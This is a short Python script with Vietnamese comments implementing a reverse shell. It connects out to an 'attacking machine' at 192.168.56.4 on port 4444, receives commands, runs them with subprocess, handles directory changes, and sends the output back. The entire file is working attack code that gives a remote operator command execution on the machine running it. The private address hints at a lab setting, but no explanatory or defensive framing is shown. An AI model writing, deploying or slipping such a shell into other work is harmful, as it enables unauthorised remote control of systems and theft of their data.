import socket
import subprocess
import os

# IP và cổng của máy tấn công (máy server)
SERVER_IP = '192.168.56.4'
SERVER_PORT = 4444

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))

    while True:
        # Nhận lệnh từ máy chủ
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(f"[+] Changed dir to {os.getcwd()}".encode())
            except Exception as e:
                s.send(str(e).encode())
        else:
            # Thực thi lệnh hệ thống
            output = subprocess.getoutput(command)
            s.send(output.encode())

    s.close()

if __name__ == '__main__':
    connect_back()
